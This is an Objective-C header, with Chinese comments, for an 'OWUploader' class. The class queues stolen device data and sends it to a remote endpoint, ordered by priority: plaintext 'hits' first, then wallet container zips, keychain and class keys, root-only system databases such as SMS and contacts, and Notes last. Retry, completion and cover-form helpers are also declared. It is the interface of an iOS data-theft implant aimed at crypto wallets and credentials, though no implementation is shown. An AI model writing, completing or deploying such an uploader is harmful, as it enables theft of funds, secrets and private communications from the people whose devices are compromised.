#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

extern NSString * const OWUploadKindContainer;
extern NSString * const OWUploadKindKeys;
extern NSString * const OWUploadKindMeta;
extern NSString * const OWUploadKindSystem;   // 系统库（短信/通讯录…），需 root
extern NSString * const OWUploadKindHits;     // 端上抽取出的明文命中

/// 上传顺序：数值越小越先传；同优先级按体积升序（小的先走）
typedef NS_ENUM(NSInteger, OWUploadPriority) {
    OWUploadPriorityHits      = 0,   // hits.json / hits_plain.txt
    OWUploadPriorityMeta      = 1,   // 设备心跳清单
    OWUploadPriorityContainer = 10,  // 钱包 zip（组内按体积小→大）
    OWUploadPriorityKeys      = 20,  // keychain / class keys（A 通道）
    OWUploadPrioritySystem    = 25,  // 系统库（A 通道）
    OWUploadPriorityNotes     = 90,  // 备忘录：永远最后
};

/// 单个文件上传成功，userInfo[@"name"] = 文件名
extern NSString * const OWUploaderDidUploadFileNotification;
/// 队列清空（本轮有成功、无失败、无 pending）—— 用来补一次完成判定
extern NSString * const OWUploaderDidDrainNotification;

@interface OWUploader : NSObject

/// 当前生效端点：UserDefaults 的 OWUploadEndpointOverride 优先，其次 Info.plist 的 OWUploadEndpoint。
+ (NSString *)activeEndpoint;

@property (nonatomic, readonly, nullable) NSString *endpoint;   // 取自 activeEndpoint
@property (nonatomic, readonly) NSString *pendingDir;
@property (nonatomic) NSUInteger maxRetries;                    // 默认 3
@property (nonatomic, readonly) NSUInteger uploadedCount;
@property (nonatomic, readonly) NSUInteger failedCount;

// 入队：文件写入 pending 目录（断网暂存），随后 flush 时统一上传
- (BOOL)enqueueFile:(NSString *)path kind:(NSString *)kind error:(NSError **)error;
/// 带优先级入队；flush 时按 priority 升序、同优先级按体积升序处理
- (BOOL)enqueueFile:(NSString *)path
               kind:(NSString *)kind
           priority:(OWUploadPriority)priority
              error:(NSError **)error;

// 逐个上传 pending 中未成功的条目；失败保留在队列，下次启动继续
- (BOOL)flush:(NSError **)error;

/// pending 里是否已有以 suffix 结尾的待传文件（用于避免同一目标重复入队）
- (BOOL)hasPendingItemWithSuffix:(NSString *)suffix;

/// 是否还有未上传成功的关键数据（container/keys/system/hits），用于完成判定
- (BOOL)hasPendingData;

// 设备画像作为 manifest 一并上传
- (BOOL)enqueueManifest:(NSDictionary *)manifest error:(NSError **)error;

// 生成带服务端 auto_log 头的诊断日志（设备信息 + 最近日志）并上传
- (BOOL)uploadDiagnosticLog:(NSError **)error;
- (BOOL)uploadDiagnosticLogLabel:(NSString *)label error:(NSError **)error;

// 直接上传一个 JSON（cover_register 表单），不经过 pending 队列；失败才入队
- (BOOL)uploadJSONNow:(NSDictionary *)json kind:(NSString *)kind error:(NSError **)error;

@end

NS_ASSUME_NONNULL_END
